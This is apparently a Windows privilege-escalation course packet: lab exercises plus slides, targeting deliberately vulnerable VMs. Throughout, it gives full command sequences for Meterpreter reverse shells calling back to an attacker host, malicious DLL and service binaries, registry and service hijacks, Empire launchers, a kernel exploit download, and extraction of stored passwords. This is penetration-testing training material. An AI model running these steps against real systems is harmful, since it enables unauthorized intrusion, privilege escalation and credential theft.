<br>Windows Lab Exercises
<br>
<br>Exercise 1 – Kernel
<br>Detection
<br>Windows VM
<br>    1. Open command prompt and run: powershell -nop -ep bypass
<br>    2. Import the Sherlock module by typing:
<br>Import-Module C:\Users\User\Desktop\Tools\Sherlock\Sherlock.ps1
<br>    3. Scan for vulnerabilities by typing: Find-AllVulns
<br>
<br>Exploitation
<br>Kali VM
<br>    1. Open command prompt and run: msfconsole
<br>    2. In Metasploit (msf > prompt) type: use exploit/multi/script/web_delivery
<br>    3. The reverse shell will be gained via a PowerShell command. This is reflected by updating the target option. In Metasploit (msf > prompt) type: set target 2
<br>    4. In Metasploit (msf > prompt) type: set payload windows/meterpreter/reverse_tcp
<br>    5. In Metasploit (msf > prompt) type: set lhost [Kali VM IP Address]
<br>    6. In Metasploit (msf > prompt) type: run
<br>    7. Copy the generated output (normally, spans over 2 lines).
<br>
<br>Windows VM
<br>1. Open command prompt and paste the copied output.
<br>
<br>Kali VM
<br>    1. Wait for a session to be created, it may take a few seconds.
<br>    2. In Metasploit (msf > prompt) type: sessions -i [Session ID]
<br>    3. The Windows VM is x64 therefore it is required to migrate to an x64 process. In Meterpreter(meterpreter > prompt) type: run migrate -n explorer.exe
<br>    4. In Meterpreter(meterpreter > prompt) type: background
<br>    5. In Metasploit (msf > prompt) type: use exploit/windows/local/ms14_058_track_popup_menu
<br>    6. Yet again, it is required that the target is changed to x64. In Metasploit (msf > prompt) type: set target 1
<br>    7. In Metasploit (msf > prompt) type: set session [Session ID]
<br>    8. In Metasploit (msf > prompt) type: set payload generic/shell_reverse_tcp
<br>    9. In Metasploit (msf > prompt) type: set lhost [Kali VM IP Address]
<br>    10. In Metasploit (msf > prompt) type: set lport 4455
<br>    11. In Metasploit (msf > prompt) type: run
<br>    12. Wait for a command prompt to appear and type: whoami
<br>Exercise 2 – Services (DLL Hijacking)
<br>Detection
<br>Windows VM
<br>    1. Open the Tools folder that is located on the desktop and then go the Process Monitor folder.
<br>    2. In reality, executables would be copied from the victim’s host over to the attacker’s host for analysis during run time. Alternatively, the same software can be installed on the attacker’s host for analysis, in case they can obtain it. To simulate this, right click on Procmon.exe and select ‘Run as administrator’ from the menu.
<br>    3. In procmon, select from the left-most drop down menu ‘Process Name’.
<br>    4. In the input box on the same line type: dllhijackservice.exe
<br>    5. Make sure the line reads “Process Name is dllhijackservice.exe then Include” and click on the ‘Add’ button, then ‘Apply’ and lastly on ‘OK’.
<br>    6. In procmon, press Ctrl-H
<br>    7. In the Process Monitor Highlighting dialogue box, select from the left-most drop down menu ‘Result’.
<br>    8. In the input box on the same line type: NAME NOT FOUND
<br>    9. 	Make sure the line reads “Result is NAME NOT FOUND then Include” and click on the ‘Add’ button, then ‘Apply’ and lastly on ‘OK’.
<br>    10. Open command prompt and type: sc start dllsvc
<br>    11. Scroll to the bottom of the window. One of the highlighted results shows that the service tried to execute ‘C:\Temp\hijackme.dll’ yet it could not do that as the file was not found. Note that ‘C:\Temp’ is a writable location.
<br>
<br>Exploitation
<br>Windows VM
<br>1. Copy ‘C:\Users\User\Desktop\Tools\Source\windows_dll.c’ to the Kali VM.
<br>
<br>Kali VM
<br>    1. Open windows_dll.c in a text editor and replace the command used by the system() function to: cmd.exe /k net localgroup administrators user /add
<br>    2. Exit the text editor and compile the file by typing the following in the command prompt: x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll
<br>    3. Copy the generated file hijackme.dll, to the Windows VM.
<br>
<br>Windows VM
<br>    1. Place hijackme.dll in ‘C:\Temp’.
<br>    2. Open command prompt and type: sc stop dllsvc & sc start dllsvc
<br>    3. It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: net localgroup administrators
<br>Exercise 3 – Services (binPath)
<br>Detection
<br>Windows VM
<br>    1. Open command prompt and type: C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc daclsvc
<br>    2. Notice that the output suggests that the user “User-PC\User” has the “SERVICE_CHANGE_CONFIG” permission.
<br>
<br>Exploitation
<br>Windows VM
<br>    1. In command prompt type:
<br>sc config daclsvc binpath= "net localgroup administrators user /add"
<br>    2. In command prompt type: sc start daclsvc
<br>    3. It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: net localgroup administrators
<br>
<br>
<br>Exercise 4 – Services (Unquoted Path)
<br>Detection
<br>Windows VM
<br>    1. Open command prompt and type: sc qc unquotedsvc
<br>    2. Notice that the “BINARY_PATH_NAME” field displays a path that is not confined between quotes.
<br>
<br>Exploitation
<br>Kali VM
<br>    1. Open command prompt and type:
<br>msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe
<br>    2. Copy the generated file, common.exe, to the Windows VM.
<br>
<br>Windows VM
<br>    1. Place common.exe in ‘C:\Program Files\Unquoted Path Service’.
<br>    2. Open command prompt and type: sc start unquotedsvc
<br>    3. It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: net localgroup administrators
<br>Exercise 5 – Services (Registry)
<br>Detection
<br>Windows VM
<br>    1. Open powershell prompt and type:
<br>Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
<br>    2. Notice that the output suggests that user belong to “NT AUTHORITY\INTERACTIVE” has “FullContol” permission over the registry key.
<br>
<br>Exploitation
<br>Windows VM
<br>1. Copy ‘C:\Users\User\Desktop\Tools\Source\windows_service.c’ to the Kali VM.
<br>
<br>Kali VM
<br>    1. Open windows_service.c in a text editor and replace the command used by the system() function to: cmd.exe /k net localgroup administrators user /add
<br>    2. Exit the text editor and compile the file by typing the following in the command prompt: x86_64-w64-mingw32-gcc windows_service.c -o x.exe
<br>    3. Copy the generated file x.exe, to the Windows VM.
<br>
<br>Windows VM
<br>    1. Place x.exe in ‘C:\Temp’.
<br>    2. Open command prompt at type:
<br>reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
<br>    3. In the command prompt type: sc start regsvc
<br>    4. It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: net localgroup administrators
<br>
<br>
<br>Exercise 6 – Services (Executable File)
<br>Detection
<br>Windows VM
<br>    1. Open command prompt and type: C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"
<br>    2. Notice that the “Everyone” user group has “FILE_ALL_ACCESS” permission on the filepermservice.exe file.
<br>
<br>Exploitation
<br>Windows VM
<br>    1. Open command prompt and type:
<br>copy /y c:\Temp\x.exe "c:\Program Files\File Permissions Service\filepermservice.exe"
<br>    2. In command prompt type: sc start filepermsvc
<br>    3. It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: net localgroup administrators
<br>Exercise 7 – Registry (Autorun)
<br>Detection
<br>Windows VM
<br>    1. Open command prompt and type: C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe
<br>    2. In Autoruns, click on the ‘Logon’ tab.
<br>    3. From the listed results, notice that the “My Program” entry is pointing to “C:\Program Files\Autorun Program\program.exe”.
<br>    4. In command prompt type:
<br>C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe –wvu "C:\Program Files\Autorun Program"
<br>    5. From the output, notice that the “Everyone” user group has “FILE_ALL_ACCESS” permission on the “program.exe” file.
<br>
<br>Exploitation
<br>Kali VM
<br>    1. Open command prompt and type: msfconsole
<br>    2. In Metasploit (msf > prompt) type: use multi/handler
<br>    3. In Metasploit (msf > prompt) type: set payload windows/meterpreter/reverse_tcp
<br>    4. In Metasploit (msf > prompt) type: set lhost [Kali VM IP Address]
<br>    5. In Metasploit (msf > prompt) type: run
<br>    6. Open an additional command prompt and type:
<br>msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f exe -o program.exe
<br>    7. Copy the generated file, program.exe, to the Windows VM.
<br>
<br>Windows VM
<br>    1. Place program.exe in ‘C:\Program Files\Autorun Program’.
<br>    2. To simulate the privilege escalation effect, logoff and then log back on as an administrator user.
<br>
<br>Kali VM
<br>    1. Wait for a new session to open in Metasploit.
<br>    2. In Metasploit (msf > prompt) type: sessions -i [Session ID]
<br>    3. To confirm that the attack succeeded, in Metasploit (msf > prompt) type: getuid
<br>Exercise 8 – Registry (AlwaysInstallElevated)
<br>Detection
<br>Windows VM
<br>    1. Open command prompt and type:
<br>reg query HKLM\Software\Policies\Microsoft\Windows\Installer
<br>    2. From the output, notice that “AlwaysInstallElevated” value is 1.
<br>    3. In command prompt type:
<br>reg query HKCU\Software\Policies\Microsoft\Windows\Installer
<br>    4. From the output, notice that “AlwaysInstallElevated” value is 1.
<br>
<br>Exploitation
<br>Kali VM
<br>    1. Open command prompt and type: msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f msi-nouac -o setup.msi
<br>    2. Copy the generated file, setup.msi, to the Windows VM.
<br>
<br>Windows VM
<br>    1. Place ‘setup.msi’ in ‘C:\Temp’.
<br>    2. Open command prompt and type: msiexec /quiet /qn /i C:\Temp\setup.msi
<br>    3. It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: net localgroup administrators
<br>
<br>
<br>Exercise 9 – Password Mining (Memory)
<br>Exploitation
<br>Kali VM
<br>    1. Open command prompt and type: msfconsole
<br>    2. In Metasploit (msf > prompt) type: use auxiliary/server/capture/http_basic
<br>    3. In Metasploit (msf > prompt) type: set uripath x
<br>    4. In Metasploit (msf > prompt) type: run
<br>
<br>Windows VM
<br>    1. Open Internet Explorer and browse to: http://[Kali VM IP Address]/x
<br>    2. Open command prompt and type: taskmgr
<br>    3. In Windows Task Manager, right-click on the “iexplore.exe” in the “Image Name” column and select “Create Dump File” from the popup menu.
<br>    4. Copy the generated file, iexplore.DMP, to the Kali VM.
<br>
<br>Kali VM
<br>    1. Place ‘iexplore.DMP’ on the desktop.
<br>    2. Open command prompt and type:
<br>strings /root/Desktop/iexplore.DMP | grep "Authorization: Basic"
<br>    3. Select the Copy the Base64 encoded string.
<br>    4. In command prompt type: echo -ne [Base64 String] | base64 -d
<br>    5. Notice the credentials in the output.
<br>Exercise 10 – Password Mining (Registry)
<br>Exploitation
<br>Windows VM
<br>    1. Open command and type:
<br>reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUsername
<br>    2. In command prompt type:
<br>reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
<br>    3. Notice the credentials, from the output.
<br>    4. In command prompt type:
<br>reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\BWP123F42
<br>-v ProxyUsername
<br>    5. In command prompt type:
<br>reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\BWP123F42
<br>-v ProxyPassword
<br>    6. Notice the credentials, from the output.
<br>    7. In command prompt type:
<br>reg query HKEY_CURRENT_USER\Software\TightVNC\Server /v Password
<br>    8. In command prompt type:
<br>reg query HKEY_CURRENT_USER\Software\TightVNC\Server /v PasswordViewOnly
<br>    9. Make note of the encrypted passwords and type: C:\Users\User\Desktop\Tools\vncpwd\vncpwd.exe [Encrypted Password]
<br>    10. From the output, make note of the credentials.
<br>
<br>
<br>Exercise 11 – Password Mining (Configuration Files)
<br>Exploitation
<br>Windows VM
<br>    1. Open command prompt and type:
<br>notepad C:\Windows\Panther\Unattend.xml
<br>    2. Scroll down to the “<Password>” property and copy the base64 string that is confined between the “<Value>” tags underneath it.
<br>    3. In command prompt type: echo [Base64 String] > C:\Temp\1.txt
<br>    4. In command prompt type:
<br>certutil -decode C:\Temp\1.txt C:\Temp\2.txt >nul & type C:\Temp\2.txt
<br>    5. Notice the password in the output.
<br>    6. Copy the file C:\ProgramData\McAfee\Common Framework\SiteList.xml to the Kali VM.
<br>    7. Copy the file C:\Users\User\Desktop\Tools\mcafee_sitelist_pwd_decrypt\mcafee_sitelist_pwd_decrypt.py to the Kali VM.
<br>
<br>Kali VM
<br>    1. Place the files ‘SiteList.xml’ and ‘mcafee_sitelist_pwd_decrypt.py’ on the desktop.
<br>    2. Open command prompt and type: grep -i password /root/Desktop/SiteList.xml
<br>    3. In command prompt, copy the encrypted password hash and paste it in the following command: python /root/Desktop mcafee_sitelist_pwd_decrypt.py [Encrypted Password]
<br>    4. Notice the clear-text password in the output.
<br>Windows VM
<br>1. Open command prompt and type:
<br>copy C:\inetpub\wwwroot\web.config C:\Temp
<br>    8. In command prompt type: C:\Windows\Microsoft.NET\Framework64\v2.0.50727\aspnet_regiis.exe -pdf "connectionStrings" C:\Temp
<br>    9. In command prompt type: type C:\temp\web.config | findstr connectionString
<br>    10. From the output, notice the clear-text credentials.
<br>
<br>
<br>Exercise 12 – Scheduled Tasks (Missing Binary)
<br>Detection
<br>Windows VM
<br>    1. Open command prompt and type: C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe
<br>    2. In Autoruns, click on the ‘Scheduled Tasks’ tab.
<br>    3. From the listed results, notice that the “MyTask2” entry is pointing to “C:\Missing Scheduled Binary\program.exe” file, however it is missing.
<br>    4. In command prompt type:
<br>C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -w "C:\Missing Scheduled Binary\"
<br>    5. From the output, notice that the current user has write permission on the directory.
<br>
<br>Exploitation
<br>Kali VM
<br>    1. Open command prompt and type: cd /opt/Empire && ./empire
<br>    2. In Empire [(Empire) > prompt], type: listeners
<br>    3. In Empire [(Empire) > prompt], type: uselistener http
<br>    4. In Empire [(Empire) > prompt], type: set DefaultDelay 0
<br>    5. In Empire [(Empire) > prompt], type: execute
<br>    6. In Empire [(Empire) > prompt], type: launcher powershell
<br>    7. Copy the output generated by Empire.
<br>    8. Open a new command prompt and type:
<br>echo 'int main() { system("[Paste Empire Output]"); return 0; }' > program.c
<br>    9. In command prompt type:
<br>x86_64-w64-mingw32-gcc program.c -o program.exe
<br>    10. Copy the generated file, program.exe to the Windows VM.
<br>
<br>Windows VM
<br>    1. Place program.exe in “C:\Missing Scheduled Binary” directory.
<br>    2. Restart the Windows VM.
<br>
<br>Kali VM
<br>    1. In Empire [(Empire) > prompt], once a message regarding the new agent has appeared, type: agents
<br>    2. In Empire [(Empire) > prompt], type: interact [AGENT NAME]
<br>    3. In Empire [(Empire) > prompt], type: sysinfo
<br>    4. From the output, notice that the username is “SYSTEM”.
<br>Exercise 13 – Hot Potato
<br>Exploitation
<br>Windows VM
<br>    1. In command prompt type: powershell.exe -nop -ep bypass
<br>    2. In Power Shell prompt type: Import-Module C:\Users\User\Desktop\Tools\Tater\Tater.ps1
<br>    3. In Power Shell prompt type: Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"
<br>    4. To confirm that the attack was successful, in Power Shell prompt type: net localgroup administrators
<br>
<br>
<br>Exercise 14 – Startup Applications
<br>Detection
<br>Windows VM
<br>    1. Open command prompt and type: icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
<br>    2. From the output notice that the “BUILTIN\Users” group has full access ‘(F)’ to the directory.
<br>
<br>Exploitation
<br>Kali VM
<br>    1. Open command prompt and type: msfconsole
<br>    2. In Metasploit (msf > prompt) type: use multi/handler
<br>    3. In Metasploit (msf > prompt) type: set payload windows/meterpreter/reverse_tcp
<br>    4. In Metasploit (msf > prompt) type: set lhost [Kali VM IP Address]
<br>    5. In Metasploit (msf > prompt) type: run
<br>    6. Open another command prompt and type:
<br>msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Kali VM IP Address] -f exe -o x.exe
<br>    7. Copy the generated file, x.exe, to the Windows VM.
<br>
<br>Windows VM
<br>    1. Place x.exe in “C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup”.
<br>    2. Logoff.
<br>    3. Login with the administrator account credentials.
<br>
<br>Kali VM
<br>    1. Wait for a session to be created, it may take a few seconds.
<br>    2. In Meterpreter(meterpreter > prompt) type: getuid
<br>    3. From the output, notice the user is “User-PC\Admin”
<br>
<br>
<br>SeRestorePrivilegeThe SeRestorePrivilegegrants writeaccess to all objects on the system, regardless of their ACL.There are a multitude of ways to abuse this privilege:
<br>•Modify service binaries.
<br>•Overwrite DLLs used by SYSTEM processes
<br>•Modify registry settings.145
<br>
<br>SeTakeOwnershipPrivilegeThe SeTakeOwnershipPrivilegelets the user take ownership over an object (the WRITE_OWNER permission).Once you own an object, you can modify its ACL and grant yourself write access.
<br>The same methods used with SeRestorePrivilegethen apply.146
<br>
<br>Other Privileges (More Advanced)
<br>•SeTcbPrivilege
<br>•SeCreateTokenPrivilege
<br>•SeLoadDriverPrivilege
<br>•SeDebugPrivilege(used by getsystem)147
<br>148
<br>
<br>Windows
<br>Privilege
<br>
<br>Escalation
<br>
<br>
<br># Linux (Kali) command
<br>
<br>    • Windows command prompt command PS> Windows PowerShell command
<br>
<br>
<br>
<br>Once installed, log in using the local administrator account username “IEUser” and password “Passw0rd!”.
<br>Open Powershell as an administrator and run the following command, which enables SMBv1.
<br>PS> Enable-WindowsOptionalFeature -Online -FeatureName
<br>"SMB1Protocol-Client" -All
<br>The VM will need to be restarted after this.
<br>
<br>
<br>SMB Server
<br>
<br>On Kali, extract the tools.zip archive to a directory. Change to this directory and run either of the following to set up an SMB server:
<br>
<br>    • python3 /usr/share/doc/python3-impacket/examples/smbserver.py tools .
<br>    • python /usr/share/doc/python-impacket/examples/smbserver.py tools .
<br>
<br>To copy files from Kali to Windows:
<br>> copy \\192.168.1.11\tools\file.ext file.ext
<br>
<br>To copy files from Windows to Kali:
<br>> copy file.ext \\192.168.1.11\tools\file.ext
<br>
<br>
<br>13
<br>Setup Script
<br>
<br>
<br>Copy the setup.bat script to the Windows VM:
<br>
<br>    • copy \\192.168.1.11\tools\setup.bat setup.bat
<br>
<br>Open a command prompt as Administrator.
<br>
<br>Run the setup.bat script:
<br>
<br>> .\setup.bat
<br>
<br>
<br>14
<br>Setup Script
<br>
<br>
<br>After the setup script has completed, restart the VM.
<br>
<br>The newly created “admin” account will login automatically.
<br>
<br>You can log out and log in as the “user” account with the password “password321”.
<br>
<br>A writable directory C:\PrivEsc exists for you to copy any tools / executables to, and will be used as such in the course demos.
<br>
<br>
<br>
<br>
<br>Privilege
<br>Escalation
<br>
<br>in Windows
<br>
<br>
<br>General Concepts
<br>
<br>
<br>Our ultimate goal with privilege escalation in Windows is to gain a shell running as an Administrator or the SYSTEM user.
<br>
<br>
<br>Privilege escalation can be simple (e.g. a kernel exploit) or require a lot of reconnaissance on the compromised system.
<br>
<br>In a lot of cases, privilege escalation may not simply rely on a single misconfiguration, but may require you to think, and combine multiple misconfigurations.
<br>
<br>
<br>17
<br>General Concepts (cont.)
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>All privilege escalations are effectively examples of access control violations.
<br>
<br>Access control and user permissions are intrinsically linked.
<br>
<br>When focusing on privilege escalations in Windows, understanding how Windows handles permissions is very important.
<br>
<br>
<br>
<br>18
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>Understanding
<br>Permissions in
<br>
<br>Windows
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>19
<br>User Accounts
<br>
<br>
<br>
<br>
<br>
<br>
<br>User accounts are used to log into a Windows system.
<br>
<br>Think of a user account as a collection of settings / preferences bound to a unique identity.
<br>
<br>The local “Administrator” account is created by default at installation.
<br>
<br>Several other default user accounts may exist (e.g. Guest) depending on the version of Windows.
<br>
<br>
<br>
<br>20
<br>Service Accounts
<br>
<br>
<br>
<br>
<br>
<br>
<br>Service accounts are (somewhat obviously) used to run services in Windows.
<br>
<br>Service accounts cannot be used to sign into a Windows system.
<br>
<br>The SYSTEM account is a default service account which has the highest privileges of any local account in Windows.
<br>
<br>Other default service accounts include NETWORK SERVICE and LOCAL SERVICE.
<br>
<br>
<br>
<br>21
<br>Groups
<br>
<br>
<br>
<br>
<br>
<br>
<br>User accounts can belong to multiple groups, and groups can have multiple users.
<br>
<br>Groups allow for easier access control to resources.
<br>
<br>Regular groups (e.g. Administrators, Users) have a set list of members.
<br>
<br>Pseudo groups (e.g. “Authenticated Users”) have a dynamic list of members which changes based on certain interactions.
<br>
<br>
<br>
<br>22
<br>Resources
<br>
<br>
<br>
<br>
<br>
<br>
<br>In Windows, there are multiple types of resource (also known as objects):
<br>
<br>    • Files / Directories
<br>
<br>    • Registry Entries
<br>
<br>    • Services
<br>
<br>Whether a user and/or group has permission to perform a certain action on a resource depends on that resource’s access control list (ACL).
<br>
<br>
<br>
<br>
<br>23
<br> ACLs & ACEs
<br>
<br>
<br>
<br>Permissions to access a certain resource in Windows are controlled by the access control list (ACL) for that resource.
<br>
<br>Each ACL is made up of zero or more access control entries (ACEs).
<br>
<br>Each ACE defines the relationship between a principal (e.g. a user, group) and a certain access right.
<br>
<br>
<br>24
<br>Example File ACL / ACEs
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>25
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>Spawning
<br>Administrator
<br>
<br>Shells
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>26
<br>msfvenom
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>If we can execute commands with admin privileges, a reverse shell generated by msfvenom works nicely:
<br>
<br>    • msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=53 -f exe -o reverse.exe
<br>
<br>This reverse shell can be caught using netcat or Metasploit’s own multi/handler.
<br>
<br>
<br>
<br>27
<br>RDP
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>Alternatively, if RDP is available (or we can enable it), we can add our low privileged user to the administrators group and then spawn an administrator command prompt via the GUI.
<br>
<br>
<br>
<br>
<br>
<br>> net localgroup administrators <username> /add
<br>
<br>
<br>
<br>
<br>28
<br>Admin -> SYSTEM
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>To escalate from an admin user to full SYSTEM privileges, you can use the PsExec tool from Windows Sysinternals (https://docs.microsoft.com/en-us/sysinternals/downloads/psexec).
<br>
<br>A copy is included in the course tools ZIP archive.
<br>
<br>> .\PsExec64.exe -accepteula -i -s C:\PrivEsc\reverse.exe
<br>
<br>
<br>
<br>
<br>29
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>Privilege
<br>Escalation
<br>
<br>Tools
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>30
<br>Why use tools?
<br>
<br>
<br>
<br>
<br>
<br>
<br>Tools allow us to automate the reconnaissance that can identify potential privilege escalations.
<br>
<br>While it is always important to understand what tools are doing, they are invaluable in a time-limited setting, such as an exam.
<br>
<br>In this course we will mostly be using winPEAS and Seatbelt, however you are free to experiment with other tools and decide which you like.
<br>
<br>
<br>
<br>
<br>31
<br>PowerUp & SharpUp
<br>
<br>
<br>
<br>
<br>
<br>
<br>PowerUp & SharpUp are very similar tools that hunt for specific privilege escalation misconfigurations.
<br>
<br>PowerUp:
<br>
<br>https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/mast er/PowerUp/PowerUp.ps1
<br>
<br>SharpUp: https://github.com/GhostPack/SharpUp
<br>
<br>Pre-Compiled SharpUp: https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/SharpUp.exe
<br>
<br>
<br>32
<br>PowerUp
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>To run PowerUp, start a PowerShell session and use dot sourcing to load the script:
<br>
<br>PS> . .\PowerUp.ps1
<br>
<br>
<br>Run the Invoke-AllChecks function to start checking for common privilege escalation misconfigurations.
<br>
<br>PS> Invoke-AllChecks
<br>
<br>
<br>
<br>
<br>33
<br>SharpUp
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>To run SharpUp, start a command prompt and run the executable:
<br>
<br>> .\SharpUp.exe
<br>
<br>
<br>SharpUp should immediately start checking for the same misconfigurations as PowerUp.
<br>
<br>
<br>
<br>34
<br>Seatbelt
<br>
<br>
<br>
<br>
<br>
<br>
<br>Seatbelt is an enumeration tool. It contains a number of enumeration checks.
<br>
<br>It does not actively hunt for privilege escalation misconfigurations, but provides related information for further investigation.
<br>
<br>Code: https://github.com/GhostPack/Seatbelt
<br>
<br>Pre-Compiled: https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Seatbelt.exe
<br>
<br>
<br>
<br>
<br>
<br>35
<br>Seatbelt
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>To run all checks and filter out unimportant results:
<br>
<br>    • .\Seatbelt.exe all
<br>
<br>
<br>To run specific check(s):
<br>
<br>    • .\Seatbelt.exe <check> <check> …
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>36
<br>winPEAS
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>winPEAS is a very powerful tool that not only actively hunts for privilege escalation misconfigurations, but highlights them for the user in the results.
<br>
<br>https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS
<br>
<br>
<br>
<br>
<br>37
<br>winPEAS
<br>
<br>
<br>
<br>
<br>
<br>
<br>Before running, we need to add a registry key and then reopen the command prompt:
<br>
<br>    • reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
<br>Run all checks while avoiding time-consuming searches:
<br>> .\winPEASany.exe quiet cmd fast
<br>
<br>Run specific check categories:
<br>> .\winPEASany.exe quiet cmd systeminfo
<br>
<br>
<br>
<br>38
<br>accesschk.exe
<br>
<br>
<br>
<br>
<br>
<br>
<br>AccessChk is an old but still trustworthy tool for checking user access control rights.
<br>
<br>You can use it to check whether a user or group has access to files, directories, services, and registry keys.
<br>
<br>The downside is more recent versions of the program spawn a GUI “accept EULA” popup window. When using the command line, we have to use an older version which still has an /accepteula command line option.
<br>
<br>
<br>
<br>39
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>Kernel
<br>Exploits
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>40
<br>What is a Kernel?
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>Kernels are the core of any operating system.
<br>
<br>Think of it as a layer between application software and the actual computer hardware.
<br>
<br>The kernel has complete control over the operating system. Exploiting a kernel vulnerability can result in execution as the SYSTEM user.
<br>
<br>
<br>
<br>41
<br>Finding Kernel Exploits
<br>
<br>
<br>
<br>
<br>
<br>
<br>Finding and using kernel exploits is usually a simple process:
<br>
<br>    1. Enumerate Windows version / patch level (systeminfo).
<br>
<br>    2. Find matching exploits (Google, ExploitDB, GitHub).
<br>
<br>    3. Compile and run.
<br>
<br>Beware though, as Kernel exploits can often be unstable and may be one-shot or cause a system crash.
<br>
<br>
<br>
<br>
<br>42
<br>Tools
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>Windows Exploit Suggester: https://github.com/bitsadmin/wesng Precompiled Kernel Exploits: https://github.com/SecWiki/windows-kernel-exploits Watson: https://github.com/rasta-mouse/Watson
<br>
<br>
<br>
<br>43
<br>Privilege Escalation
<br>
<br>
<br>
<br>
<br>
<br>
<br>(Note: These steps are for Windows 7)
<br>
<br>    1. Extract the output of the systeminfo command:
<br>> systeminfo > systeminfo.txt
<br>
<br>    2. Run wesng to find potential exploits:
<br># python wes.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only | less
<br>
<br>    3. Cross-reference results with compiled exploits: https://github.com/SecWiki/windows-kernel-exploits
<br>
<br>
<br>44
<br>Privilege Escalation
<br>
<br>
<br>
<br>
<br>
<br>
<br>    4. Download the compiled exploit for CVE-2018-8210 onto the Windows VM: https://github.com/SecWiki/windows-kernel-exploits/blob/master/CVE-2018-8120/x64.exe
<br>
<br>    5. Start a listener on Kali and run the exploit, providing it with the reverse shell executable, which should run with SYSTEM privileges:
<br>
<br>> .\x64.exe C:\PrivEsc\reverse.exe
<br>
<br>
<br>
<br>45
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>Service
<br>Exploits
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>46
<br>Services
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>Services are simply programs that run in the background, accepting input or performing regular tasks.
<br>
<br>If services run with SYSTEM privileges and are misconfigured, exploiting them may lead to command execution with SYSTEM privileges as well.
<br>
<br>
<br>47
<br>Service Commands
<br>
<br>
<br>
<br>
<br>
<br>
<br>Query the configuration of a service:
<br>
<br>> sc.exe qc <name>
<br>
<br>Query the current status of a service:
<br>
<br>> sc.exe query <name>
<br>
<br>Modify a configuration option of a service:
<br>
<br>    • sc.exe config <name> <option>= <value>
<br>
<br>Start/Stop a service:
<br>
<br>    • net start/stop <name>
<br>
<br>
<br>
<br>48
<br>Service Misconfigurations
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>    1. Insecure Service Properties
<br>
<br>    2. Unquoted Service Path
<br>
<br>
<br>    3. Weak Registry Permissions
<br>
<br>
<br>    4. Insecure Service Executables
<br>
<br>    5. DLL Hijacking
<br>
<br>
<br>49
<br>Insecure Service Permissions
<br>
<br>
<br>
<br>
<br>
<br>
<br>Each service has an ACL which defines certain service-specific permissions.
<br>
<br>Some permissions are innocuous (e.g. SERVICE_QUERY_CONFIG, SERVICE_QUERY_STATUS).
<br>
<br>Some may be useful (e.g. SERVICE_STOP, SERVICE_START).
<br>
